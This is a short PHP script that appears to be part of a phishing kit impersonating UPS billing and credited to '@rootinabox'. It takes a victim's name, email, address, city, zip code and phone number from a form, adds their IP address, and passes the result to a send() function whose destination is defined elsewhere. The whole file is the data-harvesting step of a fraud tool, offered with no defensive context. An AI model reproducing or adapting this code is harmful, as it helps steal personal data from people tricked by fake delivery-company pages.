<?php
	require_once('../function.php');

	$msg =  "<strong>🔥 Created BY @rootinabox 🔥</strong>\n \n".
	"<strong>‼️🥞 UPS Billing 🥞‼️</strong>\n".
	"<strong> 🌐 IP:  ".$ip."</strong>\n".
	"<strong></strong>\n".
	"<strong>Info Detail :</strong>\n".
	"<strong> Full Name : </strong><code>".$_POST['flname']."</code>\n".
	"<strong> Email : </strong><code>".$_POST['memail']."</code>\n".
	"<strong> Adress : </strong><code>".$_POST['madress']."</code>\n".
	"<strong> City : </strong><code>".$_POST['mcity']."</code>\n".
	"<strong> ZipCode : </strong><code>".$_POST['mzip']."</code>\n".
	"<strong> Phone : </strong><code>".$_POST['mphone']."</code>\n".
	"<strong></strong>\n".
	"<strong>📟 UPS Billing 📟</strong>\n \n".
	"<strong>🔥 Created BY @rootinabox 🔥</strong>\n \n";
	send($msg);

?>